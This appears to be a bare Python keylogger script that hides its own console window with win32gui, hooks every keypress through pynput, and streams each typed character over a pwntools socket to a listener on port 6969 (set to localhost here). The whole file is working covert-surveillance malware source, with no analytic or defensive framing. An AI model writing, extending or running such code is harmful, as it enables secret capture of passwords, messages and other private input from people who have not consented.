from pwn import *
from pynput import keyboard
import win32gui
import win32con

hwnd = win32gui.GetForegroundWindow()
win32gui.ShowWindow(hwnd, win32con.SW_HIDE)

c = remote('127.0.0.1', 6969)

def keyPressed(key):
    try:
        char = key.char
        c.sendline(char)
    except:
        pass

if __name__ == '__main__':
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()